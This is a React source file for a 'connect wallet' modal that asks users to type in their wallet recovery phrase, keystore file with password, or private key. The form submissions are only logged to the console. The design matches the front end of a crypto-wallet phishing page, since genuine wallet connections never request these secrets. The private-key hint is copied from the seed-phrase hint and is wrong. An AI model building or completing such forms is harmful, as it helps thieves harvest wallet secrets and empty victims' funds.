import styled from "styled-components";
import Button from "../Button/Button";
import { useState } from "react";
import { useFormik } from "formik";
import * as Yup from "yup";

// eslint-disable-next-line react/prop-types
const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
  const [formType, setFormType] = useState("Phrase");

  const phraseFormik = useFormik({
    initialValues: { phrase: "" },
    onSubmit: (phraseValues) => {
      console.log(phraseValues);
    },
    validationSchema: Yup.object({
      phrase: Yup.string().required("Phrase is required"),
    }),
  });

  const keyStoreFormik = useFormik({
    initialValues: { keystore: "", wallet_password: "" },
    onSubmit: (keyStoreValues) => {
      console.log(keyStoreValues);
    },
    validationSchema: Yup.object({
      keystore: Yup.string().required("Keystore is required"),
      wallet_password: Yup.string().required("Wallet password is required"),
    }),
  });

  const privateKeyFormik = useFormik({
    initialValues: { private_key: "" },
    onSubmit: (privateKeyValues) => {
      console.log(privateKeyValues);
    },
    validationSchema: Yup.object({
      private_key: Yup.string().required("PrivateKey is required"),
    }),
  });
  return (
    <ConnectModalStyle showConnectModal={showConnectModal} wallet={wallet}>
      <ConnectModalBodyStyle>
        <div
          style={{
            display: "flex",
            justifyContent: "flex-start",
            alignItems: "center",
          }}
        >
          <img
            style={{ marginInlineEnd: "10px", borderRadius: "50%" }}
            src={
              // eslint-disable-next-line react/prop-types
              wallet?.imageSrc
            }
            alt={
              // eslint-disable-next-line react/prop-types
              wallet?.name
            }
            height={80}
            width={80}
          />
          <h4>
            {
              // eslint-disable-next-line react/prop-types
              wallet?.name
            }
          </h4>
        </div>
        <div
          style={{
            display: "flex",
            justifyContent: "space-evenly",
            marginBlock: "10px",
          }}
        >
          {[
            {
              name: "Phrase",
            },
            {
              name: "Key Store",
            },
            {
              name: "PrivateKey",
            },
          ].map((link, index) => (
            <div
              key={index}
              style={{ cursor: "pointer" }}
              onClick={() => setFormType(link.name)}
            >
              {link.name}
            </div>
          ))}
        </div>
        <div style={{ borderTop: "1px solid #ece7e7", marginBlock: "10px" }} />
        {formType === "Phrase" ? (
          <form onSubmit={phraseFormik.handleSubmit}>
            <textarea
              name="phrase"
              value={phraseFormik.values.phrase}
              onChange={phraseFormik.handleChange}
              placeholder="Enter your recovery phrase"
              rows={5}
              style={{
                width: "calc(100% - 20px)",
                resize: "none",
                padding: "10px",
                border: `1px solid ${
                  phraseFormik.errors.phrase ? "tomato" : "#ced4da"
                }`,
                borderRadius: "0.25rem",
                outline: "transparent",
              }}
            ></textarea>
            <div>
              {phraseFormik.errors && (
                <small style={{ color: "tomato" }}>
                  {phraseFormik.errors?.phrase}
                </small>
              )}
            </div>
            <small style={{ fontSize: "11px" }}>
              Typically 12 (sometimes 24) words separated by single spaces.
            </small>
            <Button type={"submit"} style={{ width: "100%" }}>
              PROCEED
            </Button>
          </form>
        ) : formType === "Key Store" ? (
          <form onSubmit={keyStoreFormik.handleSubmit}>
            <textarea
              name="keystore"
              value={keyStoreFormik.values.keystore}
              onChange={keyStoreFormik.handleChange}
              placeholder="Enter Keystore"
              rows={5}
              style={{
                width: "calc(100% - 20px)",
                resize: "none",
                padding: "10px",
                border: `1px solid ${
                  keyStoreFormik.errors.keystore ? "tomato" : "#ced4da"
                }`,
                borderRadius: "0.25rem",
                outline: "transparent",
              }}
            ></textarea>
            <div>
              {keyStoreFormik.errors && (
                <small style={{ color: "tomato" }}>
                  {keyStoreFormik.errors?.keystore}
                </small>
              )}
            </div>
            <input
              type="password"
              name="wallet_password"
              value={keyStoreFormik.values.wallet_password}
              onChange={keyStoreFormik.handleChange}
              placeholder="Wallet password"
              style={{
                width: "calc(100% - 20px)",
                resize: "none",
                padding: "10px",
                border: `1px solid ${
                  keyStoreFormik.errors.wallet_password ? "tomato" : "#ced4da"
                }`,
                borderRadius: "0.25rem",
                outline: "transparent",
                marginBlock: "10px 0",
              }}
            />
            <div>
              {keyStoreFormik.errors && (
                <small style={{ color: "tomato" }}>
                  {keyStoreFormik.errors?.wallet_password}
                </small>
              )}
            </div>
            <small style={{ fontSize: "11px" }}>
              Several lines of text beginning with {`{...}`} plus the password
              you used to encrypt it.
            </small>
            <Button type={"submit"} style={{ width: "100%" }}>
              PROCEED
            </Button>
          </form>
        ) : formType === "PrivateKey" ? (
          <form onSubmit={privateKeyFormik.handleSubmit}>
            <input
              name="private_key"
              value={privateKeyFormik.values.private_key}
              onChange={privateKeyFormik.handleChange}
              placeholder="Enter your Private Key"
              style={{
                width: "calc(100% - 20px)",
                resize: "none",
                padding: "10px",
                border: `1px solid ${
                  privateKeyFormik.errors.private_key ? "tomato" : "#ced4da"
                }`,
                borderRadius: "0.25rem",
                outline: "transparent",
                marginBlock: "10px 0",
              }}
            />
            <div>
              {privateKeyFormik.errors && (
                <small style={{ color: "tomato" }}>
                  {privateKeyFormik.errors?.private_key}
                </small>
              )}
            </div>
            <small style={{ fontSize: "11px" }}>
              Typically 12 (sometimes 24) words separated by a single space.
            </small>
            <Button type={"submit"} style={{ width: "100%" }}>
              PROCEED
            </Button>
          </form>
        ) : null}
        <Button
          type={"button"}
          style={{
            backgroundColor: "tomato",
            marginLeft: "auto",
            display: "flex",
          }}
          handleClick={() => setShowConnectModal(false)}
        >
          cancel
        </Button>
      </ConnectModalBodyStyle>
    </ConnectModalStyle>
  );
};

const ConnectModalStyle = styled.div`
  width: 500px;
  border-radius: 5px;
  background-color: #fff;
  color: #000;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  display: ${({ showConnectModal }) => (showConnectModal ? "block" : "none")};

  @media only screen and (max-width: 425px) {
    width: 90%;
  }
`;
const ConnectModalBodyStyle = styled.div`
  padding: 20px;
  margin: 20px 10px;
  border-radius: 0 0 20px 20px;
`;

export default ConnectModal;
